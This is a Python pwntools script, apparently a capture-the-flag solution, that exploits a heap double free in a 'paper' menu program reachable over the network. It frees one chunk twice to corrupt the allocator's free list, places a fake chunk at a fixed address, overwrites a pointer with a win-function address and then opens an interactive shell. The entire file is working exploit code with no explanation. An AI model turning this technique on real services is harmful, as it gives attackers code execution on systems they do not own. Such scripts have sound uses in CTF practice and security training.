#coding:utf-8

from pwn import *

context.log_level = "debug"

local = 1
if local:
    p = remote("172.17.0.2", 1234)
    raw_input("go")
else:
    p = remote("bb.com", 1234)

def action(number):
    p.sendlineafter("delete paper\n", str(number))

def add(index, size, content):
    action(1)
    p.sendlineafter("the index you want to store(0-9):", str(index))
    p.sendlineafter("long you will enter:", str(size))
    p.recvuntil("enter your content:")
    p.send(content)

def delete(index):
    action(2)
    p.sendlineafter("please enter it's index(0-9):", str(index))

def secret(luck):
    action(3)
    p.sendlineafter("your luck number:", str(luck))


add(0, 0x30, 'a'*0x30)
add(1, 0x30, 'b'*0x30)
add(2, 0x50, 'c'*0x50)

delete(0)
delete(1)
delete(0)

add(3, 0x30, p64(0x602032)+'\n')
add(4, 0x30, 'b'*0x30)
add(5, 0x30, 'a'*0x30)
gg_addr = 0x0000000000400943
add(6, 0x30, 'd'*0x6 + p64(0)*2+p64(gg_addr)+'\n')

action(0)

p.interactive()
